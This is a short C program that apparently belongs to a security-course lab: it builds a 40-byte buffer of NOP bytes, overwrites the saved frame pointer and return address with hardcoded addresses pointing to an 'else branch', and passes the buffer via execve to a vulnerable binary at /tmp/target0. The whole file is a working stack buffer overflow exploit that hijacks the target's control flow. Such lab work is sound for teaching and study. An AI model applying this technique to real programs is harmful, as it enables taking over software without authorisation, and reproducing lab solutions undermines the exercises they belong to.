#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define TARGET "/tmp/target0"

int main(void)
{
  char *args[3];
  char *env[1];
  
  char buffer[40];
  
  memset(buffer, 0x90, 40);
  memcpy(buffer + 32, "\x68\xfe\xff\xbf\x1d\x85\x04\x08", 8); // ebp, addr of else branch

  args[0] = TARGET;
  args[1] = buffer;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
